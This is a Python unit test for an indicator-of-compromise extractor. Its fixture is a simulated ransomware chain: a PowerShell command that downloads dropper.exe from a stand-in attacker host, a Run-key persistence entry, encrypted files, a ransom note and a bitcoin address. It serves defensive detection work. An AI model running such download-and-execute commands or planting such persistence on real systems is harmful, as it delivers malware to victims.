from app.services.ioc_extractor import extract_iocs_from_chains


def test_extract_iocs_from_chain_actions():
    chains = [
        {
            "actions": [
                {
                    "command_line": (
                        "powershell iwr http://evil.example.com/dropper.exe "
                        "-OutFile C:\\Users\\Public\\dropper.exe "
                        "Contact recovery@example.com and pay "
                        "1BoatSLRHtKNngkdXEeobR76b53LETtpyT"
                    ),
                    "destination_ip": "8.8.8.8",
                    "hashes": "SHA256=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
                    "target_object": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
                },
                {
                    "event_id": "11",
                    "target_filename": "C:\\Users\\victim\\Documents\\budget.xlsx.locked",
                },
                {
                    "event_id": "11",
                    "target_filename": "C:\\Users\\victim\\Documents\\HOW_TO_DECRYPT.txt",
                },
            ]
        }
    ]

    iocs = extract_iocs_from_chains(chains)

    assert "8.8.8.8" in iocs["ips"]
    assert "evil.example.com" in iocs["domains"]
    assert "http://evil.example.com/dropper.exe" in iocs["urls"]
    assert "c:\\users\\public\\dropper.exe" not in iocs["file_paths"]
    assert "C:\\Users\\Public\\dropper.exe" in iocs["file_paths"]
    assert "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater" in iocs["registry_keys"]
    assert "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" in iocs["hashes"]
    assert "HOW_TO_DECRYPT.txt" in iocs["ransom_notes"]
    assert ".locked" in iocs["encrypted_extensions"]
    assert "dropper.exe" in iocs["suspicious_file_names"]
    assert "1BoatSLRHtKNngkdXEeobR76b53LETtpyT" in iocs["bitcoin_addresses"]
    assert "recovery@example.com" in iocs["email_addresses"]
